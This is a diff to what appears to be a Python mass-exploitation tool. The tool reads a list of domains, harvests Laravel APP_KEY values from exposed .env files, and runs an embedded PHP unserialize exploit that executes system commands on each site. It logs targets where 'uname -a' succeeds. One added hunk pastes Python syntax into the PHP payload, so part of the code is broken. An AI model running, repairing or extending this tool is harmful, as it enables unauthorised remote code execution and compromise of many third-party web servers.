@@ -143,7 +143,7 @@ def checkenv(site):
                             app_key_match = re.search(r"APP_KEY=(.+)", request.text)
                             if app_key_match:
                                 app_key = app_key_match.group(1).strip()
-                                exploit_laravel_unserialize(url, app_key)
+                                exploit_laravel_unserialize(site, app_key)
                 else:
                     if path.endswith("/register") or path.endswith("/admin/register"):
                         if request.status_code == 404:
@@ -288,7 +288,7 @@ def test_backpack(site):
         except Exception as e:
             print(f"{fr}# {fw}" + site + f"{fw} | {fr}BOSOK")
 
-def exploit_laravel_unserialize(url, app_key):
+def exploit_laravel_unserialize(site, app_key):
     php_exploit_code = f"""
     #!/usr/bin/env php
     <?php
@@ -381,7 +381,7 @@ def exploit_laravel_unserialize(url, app_key):
         }}
         public function HeadersToArray($str)
         {{
-            $str = explode("\r\n", $str);
+            $str = explode("\\r\\n", $str);
             $str = array_splice($str, 0, count($str) - 1);
             $output = [];
             foreach ($str as $item)
@@ -486,6 +486,10 @@ def exploit_laravel_unserialize(url, app_key):
             $bre = $Req->Requests($urls,null, $header, false);
             $res = explode('</html>', $bre->body)[1];
             echo ($res) ? $res . PHP_EOL : 'Empty Response' . PHP_EOL;
+            if "uname -a" in res:
+                with open("result_unserialize.txt", "a") as result_file:
+                    result_file.write(url + "\n")
+                    break
         }}
     }}
     else
@@ -498,13 +502,13 @@ def exploit_laravel_unserialize(url, app_key):
         file.write(php_exploit_code)
 
     try:
-        result = subprocess.run(['php', 'exploit.php', f'url={url}', f'key={app_key}', 'function=system', 'method=1'],
-                                capture_output=True, text=True, timeout=10)
+        result = subprocess.run(['php', 'exploit.php', f'url={site}', f'key={app_key}', 'function=system', 'method=1'],
+                                capture_output=True, text=True, timeout=60)
         if 'uname -a' in result.stdout:
             with open('result_unserialize.txt', 'a') as result_file:
-                result_file.write(url + "\n")
+                result_file.write(site + "\n")
     except subprocess.TimeoutExpired:
-        print(f"Timeout while trying to exploit {url}")
+        print(f"Timeout while trying to exploit {site}")
 
 def main(file_path):
     domains = read_urls(file_path)
@@ -526,7 +530,7 @@ def main(file_path):
         print(result)
 
 def read_urls(file_path):
-    with open(file_path, 'r', encoding='utf-8') as file):
+    with open(file_path, 'r', encoding='utf-8') as file:
         urls = file.readlines()
     return [url.strip() for url in urls]
 
